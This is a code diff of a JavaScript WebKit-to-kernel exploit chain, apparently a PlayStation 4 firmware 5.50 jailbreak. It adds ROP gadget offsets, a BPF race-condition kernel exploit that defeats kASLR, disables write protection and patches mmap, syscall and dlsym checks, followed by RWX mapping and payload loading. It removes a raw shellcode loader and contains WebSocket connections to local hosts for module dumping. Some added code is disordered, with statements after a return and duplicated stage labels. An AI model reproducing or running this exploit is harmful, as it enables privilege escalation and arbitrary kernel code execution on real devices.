@@ -27,7 +27,7 @@ var dumpModuleXHR = function(moduleBase) {
     var chunk = new ArrayBuffer(0x1000);
     var chunk32 = new Uint32Array(chunk);
     var chunk8 = new Uint8Array(chunk);
-    connection = new WebSocket('ws://10.17.0.1:8080');
+    connection = new WebSocket('ws://192.168.43.6:8000');
     connection.binaryType = "arraybuffer";
     var helo = new Uint32Array(1);
     helo[0] = 0x41414141;
@@ -56,42 +56,6 @@ var get_jmptgt = function(addr)
     return addr.add32(y+6);
     
 }
-var gadgetmap_wk = {
-    "ep": [0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5D, 0xC3],
-        /*
-        0:  5b                      pop    rbx
-        1:  41 5c                   pop    r12
-        3:  41 5d                   pop    r13
-        5:  41 5e                   pop    r14
-        7:  41 5f                   pop    r15
-        9:  5d                      pop    rbp
-        a:  c3                      ret
-    */
-    "pop rsi": [0x5E, 0xC3],
-    "pop rdi": [0x5F, 0xC3],
-    "pop rsp": [0x5c, 0xC3],
-    "pop rax": [0x58, 0xC3],
-    "pop rdx": [0x5a, 0xC3],
-    "pop rcx": [0x59, 0xC3],
-    "pop rsp": [0x5c, 0xC3],
-    "pop rbp": [0x5d, 0xC3],
-    "pop r8": [0x47, 0x58, 0xC3],
-    "pop r9": [0x47, 0x59, 0xC3],
-    "infloop": [0xEB, 0xFE, 0xc3],
-    "ret": [0xC3],
-    "mov [rdi], rsi": [0x48, 0x89, 0x37, 0xC3],
-    "mov [rax], rsi": [0x48, 0x89, 0x30, 0xC3],
-    "mov [rdi], rax": [0x48, 0x89, 0x07, 0xC3],
-    "mov rxa, rdi": [0x48, 0x89, 0xF8, 0xC3]
-};
-var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
-            /*
-            0:  48 8b 7f 48             mov    rdi,QWORD PTR [rdi+0x48]
-            4:  48 8b 07                mov    rax,QWORD PTR [rdi]
-            7:  48 8b 40 30             mov    rax,QWORD PTR [rax+0x30]
-            b:  ff e0                   jmp    rax
-            */
-slowpath_jop.reverse();
 
 var gadgets;
 
@@ -148,7 +112,8 @@ window.stage2 = function() {
         print(e);
     }
 }
-var gadgetcache = {"ret":60,
+var gadgetcache = {
+"ret":60,
 "ep":173,
 "pop rbp":182,
 "pop rax":17781,
@@ -177,9 +142,9 @@ window.stage2_ = function() {
         var fptr_store = p.leakval(func);
         return (p.read8(fptr_store.add32(0x18))).add32(0x40);
     }
-    gadgetconn = 0;
-    if (!gadgetcache)
-        gadgetconn = new WebSocket('ws://10.17.0.1:8080');
+     gadgetconn = 0;
+    if (!gadgets)
+        gadgetconn = new WebSocket('ws://192.168.43.6:8000');
 
     var parseFloatStore = p.leakfunc(parseFloat);
     var parseFloatPtr = p.read8(parseFloatStore);
@@ -190,7 +155,11 @@ window.stage2_ = function() {
     webKitBase.low &= 0xfffff000;
     webKitBase.sub32inplace(0x5b7000-0x1C000);
     
-    print("libwebkit base at: 0x" + webKitBase);
+    window.moduleBaseWebKit = webKitBase;
+
+    var offsetToWebKit = function(off) {
+      return window.moduleBaseWebKit.add32(off)
+    }
     
     var o2wk = function(o)
     {
@@ -251,7 +220,7 @@ window.stage2_ = function() {
         {
             gadgets_to_find=0;
             slowpath_jop=0;
-            log("using cached gadgets");
+            log("using gadgets");
             
             for (var gadgetname in gadgetcache) {
                 if (gadgetcache.hasOwnProperty(gadgetname)) {
@@ -740,134 +709,14 @@ window.stage2_ = function() {
     window.nameforsyscall = swapkeyval(window.syscallnames);
     
     window.syscalls = {};
-         function ping(url) {
-    "use strict";
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", url, false);
-    xhr.send(null);
-}
+         
 
 /* Simply adds given offset to given module's base address */
 function getGadget(moduleName, offset) {
     return add2(window.ECore.moduleBaseAddresses[moduleName], offset);
 }
-    function writeLoader(p, addr) {
-	p.write4(addr.add32(0x00000000), 0x00000be9);
-	p.write4(addr.add32(0x00000004), 0x0f2e6600);
-	p.write4(addr.add32(0x00000008), 0x0000841f);
-	p.write4(addr.add32(0x0000000C), 0x90000000);
-	p.write4(addr.add32(0x00000010), 0x54415541);
-	p.write4(addr.add32(0x00000014), 0x83485355);
-	p.write4(addr.add32(0x00000018), 0xd23118ec);
-	p.write4(addr.add32(0x0000001C), 0x000001be);
-	p.write4(addr.add32(0x00000020), 0x0002bf00);
-	p.write4(addr.add32(0x00000024), 0x04c60000);
-	p.write4(addr.add32(0x00000028), 0xb8481024);
-	p.write4(addr.add32(0x0000002C), 0x2610012f);
-	p.write4(addr.add32(0x00000030), 0x00000009);
-	p.write4(addr.add32(0x00000034), 0x012444c6);
-	p.write4(addr.add32(0x00000038), 0x08bc4902);
-	p.write4(addr.add32(0x0000003C), 0x09261001);
-	p.write4(addr.add32(0x00000040), 0xc7000000);
-	p.write4(addr.add32(0x00000044), 0x00042444);
-	p.write4(addr.add32(0x00000048), 0x66000000);
-	p.write4(addr.add32(0x0000004C), 0x022444c7);
-	p.write4(addr.add32(0x00000050), 0x44c63c23);
-	p.write4(addr.add32(0x00000054), 0xc6000a24);
-	p.write4(addr.add32(0x00000058), 0x000b2444);
-	p.write4(addr.add32(0x0000005C), 0x0c2444c6);
-	p.write4(addr.add32(0x00000060), 0x2444c600);
-	p.write4(addr.add32(0x00000064), 0x44c6000d);
-	p.write4(addr.add32(0x00000068), 0xc6000e24);
-	p.write4(addr.add32(0x0000006C), 0x000f2444);
-	p.write4(addr.add32(0x00000070), 0x10bad0ff);
-	p.write4(addr.add32(0x00000074), 0x48000000);
-	p.write4(addr.add32(0x00000078), 0x8941e689);
-	p.write4(addr.add32(0x0000007C), 0x48c789c5);
-	p.write4(addr.add32(0x00000080), 0x10013cb8);
-	p.write4(addr.add32(0x00000084), 0x00000926);
-	p.write4(addr.add32(0x00000088), 0xbed0ff00);
-	p.write4(addr.add32(0x0000008C), 0x0000000a);
-	p.write4(addr.add32(0x00000090), 0x48ef8944);
-	p.write4(addr.add32(0x00000094), 0x100149b8);
-	p.write4(addr.add32(0x00000098), 0x00000926);
-	p.write4(addr.add32(0x0000009C), 0x31d0ff00);
-	p.write4(addr.add32(0x000000A0), 0x44f631d2);
-	p.write4(addr.add32(0x000000A4), 0xb848ef89);
-	p.write4(addr.add32(0x000000A8), 0x26100122);
-	p.write4(addr.add32(0x000000AC), 0x00000009);
-	p.write4(addr.add32(0x000000B0), 0xc589d0ff);
-	p.write4(addr.add32(0x000000B4), 0x0000b848);
-	p.write4(addr.add32(0x000000B8), 0x00092620);
-	p.write4(addr.add32(0x000000BC), 0x00c60000);
-	p.write4(addr.add32(0x000000C0), 0xc38948c3);
-	p.write4(addr.add32(0x000000C4), 0x906607eb);
-	p.write4(addr.add32(0x000000C8), 0x01489848);
-	p.write4(addr.add32(0x000000CC), 0x1000bac3);
-	p.write4(addr.add32(0x000000D0), 0x89480000);
-	p.write4(addr.add32(0x000000D4), 0x41ef89de);
-	p.write4(addr.add32(0x000000D8), 0xc085d4ff);
-	p.write4(addr.add32(0x000000DC), 0x8944ea7f);
-	p.write4(addr.add32(0x000000E0), 0x15bb48ef);
-	p.write4(addr.add32(0x000000E4), 0x09261001);
-	p.write4(addr.add32(0x000000E8), 0xff000000);
-	p.write4(addr.add32(0x000000EC), 0xffef89d3);
-	p.write4(addr.add32(0x000000F0), 0x00b848d3);
-	p.write4(addr.add32(0x000000F4), 0x09262000);
-	p.write4(addr.add32(0x000000F8), 0xff000000);
-	p.write4(addr.add32(0x000000FC), 0xc48348d0);
-	p.write4(addr.add32(0x00000100), 0x415d5b18);
-	p.write4(addr.add32(0x00000104), 0xc35d415c);
-	p.write4(addr.add32(0x00000108), 0x03c0c748);
-	p.write4(addr.add32(0x0000010C), 0x49000000);
-	p.write4(addr.add32(0x00000110), 0x050fca89);
-	p.write4(addr.add32(0x00000114), 0xc0c748c3);
-	p.write4(addr.add32(0x00000118), 0x00000006);
-	p.write4(addr.add32(0x0000011C), 0x0fca8949);
-	p.write4(addr.add32(0x00000120), 0xc748c305);
-	p.write4(addr.add32(0x00000124), 0x00001ec0);
-	p.write4(addr.add32(0x00000128), 0xca894900);
-	p.write4(addr.add32(0x0000012C), 0x48c3050f);
-	p.write4(addr.add32(0x00000130), 0x0061c0c7);
-	p.write4(addr.add32(0x00000134), 0x89490000);
-	p.write4(addr.add32(0x00000138), 0xc3050fca);
-	p.write4(addr.add32(0x0000013C), 0x68c0c748);
-	p.write4(addr.add32(0x00000140), 0x49000000);
-	p.write4(addr.add32(0x00000144), 0x050fca89);
-	p.write4(addr.add32(0x00000148), 0xc0c748c3);
-	p.write4(addr.add32(0x0000014C), 0x0000006a);
-	p.write4(addr.add32(0x00000150), 0x0fca8949);
-	p.write4(addr.add32(0x00000154), 0x0000c305);
-	p.write4(addr.add32(0x00000158), 0x00000014);
-	p.write4(addr.add32(0x0000015C), 0x00000000);
-	p.write4(addr.add32(0x00000160), 0x00527a01);
-	p.write4(addr.add32(0x00000164), 0x01107801);
-	p.write4(addr.add32(0x00000168), 0x08070c1b);
-	p.write4(addr.add32(0x0000016C), 0x00000190);
-	p.write4(addr.add32(0x00000170), 0x00000034);
-	p.write4(addr.add32(0x00000174), 0x0000001c);
-	p.write4(addr.add32(0x00000178), 0xfffffe98);
-	p.write4(addr.add32(0x0000017C), 0x000000f8);
-	p.write4(addr.add32(0x00000180), 0x100e4200);
-	p.write4(addr.add32(0x00000184), 0x0e42028d);
-	p.write4(addr.add32(0x00000188), 0x41038c18);
-	p.write4(addr.add32(0x0000018C), 0x0486200e);
-	p.write4(addr.add32(0x00000190), 0x83280e41);
-	p.write4(addr.add32(0x00000194), 0x400e4405);
-	p.write4(addr.add32(0x00000198), 0x280ee702);
-	p.write4(addr.add32(0x0000019C), 0x41200e41);
-	p.write4(addr.add32(0x000001A0), 0x0e42180e);
-	p.write4(addr.add32(0x000001A4), 0x080e4210);
-	p.write4(addr.add32(0x000001A8), 0x3b031b01);
-	p.write4(addr.add32(0x000001AC), 0xffffffac);
-	p.write4(addr.add32(0x000001B0), 0x00000001);
-	p.write4(addr.add32(0x000001B4), 0xfffffe68);
-	p.write4(addr.add32(0x000001B8), 0xffffffc8);
-}
-
-/* All function stubs / imports from other modules */
-var BasicImportMap = function() {
-    window.basicImportMap = {
+var slowpath_jop = function() {
+    slowpath_jop = {
         '5.50': {
             'setjmp': getGadget('libSceWebKit2', 0x14F8), // setjmp imported from libkernel
             '__stack_chk_fail_ptr': getGadget('libSceWebKit2', 0x384BA40), // pointer to pointer to stack_chk_fail imported from libkernel -> look at epilogs to find this
@@ -877,9 +726,9 @@ var BasicImportMap = function() {
 }
 
 /* All gadgets from the binary of available modules */
-var GadgetMap = function() {
-    window.gadgetMap = {
-        '5.01': {
+var gadgetmap_wk = function() {
+    gadgetmap_wk = {
+        '5.50': {
             'pop rsi': getGadget('libSceWebKit2', 0x0008f38a), // 0x000000000008f38a : pop rsi ; ret // 5ec3
             'pop rdi': getGadget('libSceWebKit2', 0x00038dba), // pop rdi ; ret
             'pop rax': getGadget('libSceWebKit2', 0x000043f5), // pop rax ; ret
@@ -955,8 +804,8 @@ var GadgetMap = function() {
         }
     }
        var chain = new window.RopChain;
-    var returnvalue;
-    p.fcall_ = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
+    
+    p.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
         chain.clear();
         
         chain.notimes = this.next_notime;
@@ -974,11 +823,8 @@ var GadgetMap = function() {
         if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
         returnvalue = p.read8(chain.ropframeptr.add32(0x3ff8)); //p.read8(chain.ropframeptr.add32(0x3ff8));
     }
-    p.fcall = function()
-    {
-        var rv=p.fcall_.apply(this,arguments);
-        return returnvalue;
-    }
+    
+    
     p.readstr = function(addr){
         var addr_ = addr.add32(0); // copy
         var rd = p.read4(addr_);
@@ -1009,13 +855,37 @@ var GadgetMap = function() {
         
         return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
     }
+    
+    p.writeString = function (addr, str)
+    {
+      for (var i = 0; i < str.length; i++)
+      {
+        var byte = p.read4(addr.add32(i));
+        byte &= 0xFFFF0000;
+        byte |= str.charCodeAt(i);
+        p.write4(addr.add32(i), byte);
+      }
+    }
+    
+     p.readString = function(addr)
+    {
+      var byte = p.read4(addr);
+      var str  = "";
+      while (byte & 0xFF)
+      {
+        str += String.fromCharCode(byte & 0xFF);
+        addr.add32inplace(1);
+        byte = p.read4(addr);
+      }
+      return str;
+    }
     function malloc(size)
 {
   var backing = new Uint8Array(0x10000 + size);
 
   window.nogc.push(backing);
   
-var thread2 = new window.rop();
+      var thread2 = new window.rop();
 
       thread2.clear();
       thread2.push(window.gadgets["ret"]); // nop
@@ -1032,7 +902,276 @@ var thread2 = new window.rop();
 
       window.nogc.push(contextz);
       window.nogc.push(thread2);
-  
+      
+      return thread2;
+      
+      
+      var run_count = 0;
+
+    function kernel_rop_run(fd, scratch) {
+      // wait for it
+      while (1) {
+        var ret = p.syscall("write", fd, scratch, 0x200);
+        run_count++;
+        if (ret.low == 0x200) {
+            return ret;
+        }
+      }
+    }
+      // Clear errno
+    p.write8(offsetToLibKernel(0x7CCF0), 0);
+    
+     
+      /////////////////// STAGE 1: Setting Up Programs ///////////////////
+
+      var spadp = mallocu32(0x2000);
+
+      // Open first device and bind
+      var fd1 = p.syscall("open", stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR
+
+      if(fd1 < 0) {
+        throw "Failed to open first /dev/bpf device!";
+      }
+      
+      p.syscall("ioctl", fd1, 0x8020426C, stringify("eth0")); // 8020426C = BIOCSETIF
+
+      if (p.syscall("write", fd1, spadp, 40).low == (-1 >>> 0)) {
+        p.syscall("ioctl", fd1, 0x8020426C, stringify("wlan0"));
+
+        if (p.syscall("write", fd1, spadp, 40).low == (-1 >>> 0)) {
+          throw "Failed to bind to first /dev/bpf device!";
+        }
+      }
+
+      // Open second device and bind
+      var fd2 = p.syscall("open", stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR
+
+      if(fd2 < 0) {
+        throw "Failed to open second /dev/bpf device!";
+      }
+
+      p.syscall("ioctl", fd2, 0x8020426C, stringify("eth0")); // 8020426C = BIOCSETIF
+
+      if (p.syscall("write", fd2, spadp, 40).low == (-1 >>> 0)) {
+        p.syscall("ioctl", fd2, 0x8020426C, stringify("wlan0"));
+
+        if (p.syscall("write", fd2, spadp, 40).low == (-1 >>> 0)) {
+          throw "Failed to bind to second /dev/bpf device!";
+        }
+      }
+
+      // Setup kchain stack for kernel ROP chain
+      var kchainstack = malloc(0x2000);
+      
+      /////////////////// STAGE 2: Building Kernel ROP Chain ///////////////////
+      var kchain  = new krop(p, kchainstack);
+      var savectx = malloc(0x200);
+
+      // NOP Sled
+      kchain.push(window.gadgets["ret"]);
+      kchain.push(window.gadgets["ret"]);
+      kchain.push(window.gadgets["ret"]);
+      kchain.push(window.gadgets["ret"]);
+      kchain.push(window.gadgets["ret"]);
+      kchain.push(window.gadgets["ret"]);
+      kchain.push(window.gadgets["ret"]);
+      kchain.push(window.gadgets["ret"]);
+
+      // Save context to exit back to userland when finished
+      kchain.push(window.gadgets["pop rdi"]);
+      kchain.push(savectx);
+      kchain.push(offsetToLibc(0x1D3C));
+
+      // Defeat kASLR (resolve kernel .text base)
+      var kernel_slide = new int64(-0x2610AD0, -1);
+      kchain.push(window.gadgets["pop rax"]);
+      kchain.push(savectx.add32(0x30));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(kernel_slide);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["pop rdi"]);
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov [rdi], rax"]);
+        
+      // Disable kernel write protection
+      kchain.push(window.gadgets["pop rax"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(0x280f79);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(offsetToWebKit(0x12a16)); // mov rdx, rax
+      kchain.push(window.gadgets["pop rax"]);
+      kchain.push(0x80040033);
+      kchain.push(offsetToWebKit(0x1517c7)); // jmp rdx
+
+      // Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
+      // E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
+      var kexploit_check_patch = new int64(0x000000B8, 0xC6894100);
+      kchain.push(window.gadgets["pop rax"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(0x1144E3);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["pop rsi"]);
+      kchain.push(kexploit_check_patch);
+      kchain.push(window.gadgets["mov [rax], rsi"]);
+
+      // Patch sys_mmap: Allow RWX (read-write-execute) mapping
+      var kernel_mmap_patch = new int64(0x37b64137, 0x3145c031);
+      kchain.push(window.gadgets["pop rax"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(0x141D14);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["pop rsi"]);
+      kchain.push(kernel_mmap_patch);
+      kchain.push(window.gadgets["mov [rax], rsi"]);
+
+      // Patch syscall: syscall instruction allowed anywhere
+      var kernel_syscall_patch1 = new int64(0x00000000, 0x40878b49);
+      var kernel_syscall_patch2 = new int64(0x909079eb, 0x72909090);
+      kchain.push(window.gadgets["pop rax"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(0x3DC603);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["pop rsi"]);
+      kchain.push(kernel_syscall_patch1);
+      kchain.push(window.gadgets["mov [rax], rsi"]);
+      kchain.push(window.gadgets["pop rax"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(0x3DC621);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["pop rsi"]);
+      kchain.push(kernel_syscall_patch2);
+      kchain.push(window.gadgets["mov [rax], rsi"]);
+
+      // Patch sys_dynlib_dlsym: Allow from anywhere
+      var kernel_dlsym_patch1 = new int64(0x000352E9, 0x8B489000);
+      var kernel_dlsym_patch2 = new int64(0x90C3C031, 0x90909090);
+      kchain.push(window.gadgets["pop rax"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(0x3CF6FE);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["pop rsi"]);
+      kchain.push(kernel_dlsym_patch1);
+      kchain.push(window.gadgets["mov [rax], rsi"]);
+      kchain.push(window.gadgets["pop rax"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(0x690C0);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["pop rsi"]);
+      kchain.push(kernel_dlsym_patch2);
+      kchain.push(window.gadgets["mov [rax], rsi"]);
+
+      // Add custom sys_exec() call to execute arbitrary code as kernel
+      var kernel_exec_param = new int64(0, 1);
+      kchain.push(window.gadgets["pop rax"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(0x102b8a0);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["pop rsi"]);
+      kchain.push(0x02);
+      kchain.push(window.gadgets["mov [rax], rsi"]);
+      kchain.push(window.gadgets["pop rsi"])
+      kchain.push(0x13a39f); // jmp qword ptr [rsi]
+      kchain.push(window.gadgets["pop rdi"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(offsetToWebKit(0x119d1f0)); //add rsi, [rdi]; mov rax, rsi
+      kchain.push(window.gadgets["pop rax"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(0x102b8a8);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["mov [rax], rsi"]);
+      kchain.push(window.gadgets["pop rax"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(0x102b8c8);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["pop rsi"]);
+      kchain.push(kernel_exec_param);
+      kchain.push(window.gadgets["mov [rax], rsi"]);
+
+      // Enable kernel write protection
+      kchain.push(window.gadgets["pop rax"])
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(0x280f70);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["jmp rax"])
+
+      // To userland!
+      kchain.push(window.gadgets["pop rax"]);
+      kchain.push(0);
+      kchain.push(window.gadgets["ret"]);
+      kchain.push(offsetToWebKit(0x3EBD0));
+
+      // Setup valid program
+      var bpf_valid_prog          = malloc(0x10);
+      var bpf_valid_instructions  = malloc(0x80);
+
+      p.write8(bpf_valid_instructions.add32(0x00), 0x00000000);
+      p.write8(bpf_valid_instructions.add32(0x08), 0x00000000);
+      p.write8(bpf_valid_instructions.add32(0x10), 0x00000000);
+      p.write8(bpf_valid_instructions.add32(0x18), 0x00000000);
+      p.write8(bpf_valid_instructions.add32(0x20), 0x00000000);
+      p.write8(bpf_valid_instructions.add32(0x28), 0x00000000);
+      p.write8(bpf_valid_instructions.add32(0x30), 0x00000000);
+      p.write8(bpf_valid_instructions.add32(0x38), 0x00000000);
+      p.write4(bpf_valid_instructions.add32(0x40), 0x00000006);
+      p.write4(bpf_valid_instructions.add32(0x44), 0x00000000);
+
+      p.write8(bpf_valid_prog.add32(0x00), 0x00000009);
+      p.write8(bpf_valid_prog.add32(0x08), bpf_valid_instructions);
+
+      // Setup invalid program
+      var entry = window.gadgets["pop rsp"];
+      var bpf_invalid_prog          = malloc(0x10);
+      var bpf_invalid_instructions  = malloc(0x80);
+
+      p.write4(bpf_invalid_instructions.add32(0x00), 0x00000001);
+      p.write4(bpf_invalid_instructions.add32(0x04), entry.low);
+      p.write4(bpf_invalid_instructions.add32(0x08), 0x00000003);
+      p.write4(bpf_invalid_instructions.add32(0x0C), 0x0000001E);
+      p.write4(bpf_invalid_instructions.add32(0x10), 0x00000001);
+      p.write4(bpf_invalid_instructions.add32(0x14), entry.hi);
+      p.write4(bpf_invalid_instructions.add32(0x18), 0x00000003);
+      p.write4(bpf_invalid_instructions.add32(0x1C), 0x0000001F);
+      p.write4(bpf_invalid_instructions.add32(0x20), 0x00000001);
+      p.write4(bpf_invalid_instructions.add32(0x24), kchainstack.low);
+      p.write4(bpf_invalid_instructions.add32(0x28), 0x00000003);
+      p.write4(bpf_invalid_instructions.add32(0x2C), 0x00000020);
+      p.write4(bpf_invalid_instructions.add32(0x30), 0x00000001);
+      p.write4(bpf_invalid_instructions.add32(0x34), kchainstack.hi);
+      p.write4(bpf_invalid_instructions.add32(0x38), 0x00000003);
+      p.write4(bpf_invalid_instructions.add32(0x3C), 0x00000021);
+      p.write4(bpf_invalid_instructions.add32(0x40), 0x00000006);
+      p.write4(bpf_invalid_instructions.add32(0x44), 0x00000001);
+
+      p.write8(bpf_invalid_prog.add32(0x00), 0x00000009);
+      p.write8(bpf_invalid_prog.add32(0x08), bpf_invalid_instructions);
+
+   /////////////////// STAGE 3: Racing Filters ///////////////////
+
+      // ioctl() with valid BPF program will trigger free() of old program and reallocate memory for the new one 
+   
    spawnthread(function (thread2) {
         interrupt1 = thread2.stackBase;
         thread2.push(window.gadgets["ret"]);
@@ -1075,7 +1214,36 @@ var thread2 = new window.rop();
         thread2.push(window.gadgets["pop rsp"]); // pop rdx
         thread2.push(thread2.stackBase); // what
       });
-
+      
+     /////////////////// STAGE 3: Trigger ///////////////////
+     var scratch = malloc(0x200);
+     var test = kernel_rop_run(fd1, scratch);
+  
+     
+     // create loader memory
+    var code_addr = new int64(0x26100000, 0x00000009);
+    var buffer = p.syscall("mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
+      // verify loaded
+   
+    if (buffer == '926100000') {
+      // setup the stuff
+      var scePthreadCreate = offsetToLibKernel(0x115c0);
+      var thread = malloc(0x08);
+      var thr_name = malloc(0x10);
+      p.writeString(thr_name, "loader");
+      
+     var createRet = p.fcall(scePthreadCreate, thread, 0, code_addr, 0, thr_name);
+    }
+    
+      // write dummy loader
+      for (var i = 0; i < loader.length; i++) {
+          p.write4(code_addr.add32(i * 4), loader[i]);
+      }
+     // write payload
+      for (var i = 0; i < payload.length; i++) {
+          p.write4(code_addr.add32(0x100000 + i * 4), payload[i]);
+      }  
+  
   var ptr     = p.read8(p.leakval(backing).add32(0x10));
   ptr.backing = backing;
 
@@ -1104,13 +1272,13 @@ function mallocu32(size) {
    
     log("loaded sycalls");
 
-    var rtv = p.fcall(window.gadgets["mov rax, rdi"], 0x41414141);
-    var pid = p.syscall("getpid");
-    var uid = p.syscall("getuid");
-    var suid = p.syscall("setuid", 0, 0x41414142).low;
-    print("all good. fcall test retval = 4141414141");
-    print("rtv = "+ rtv + " - uid: " + uid + " - pid: " + pid + " - suid: " + suid);
-    print("....webkit full stage 90%....");
+    
+    var pid = p.syscall("getpid", 0)== 0 ;
+    var uid = p.syscall("getuid", 0)== 0 ;
+    var suid = p.syscall("setuid", 0)== 0 ;
+    print("all good. fcall test retval = Successful");
+    print("all Stage test = 91%");
+    print("....webkit 5.50 Success....");
     
    
 }
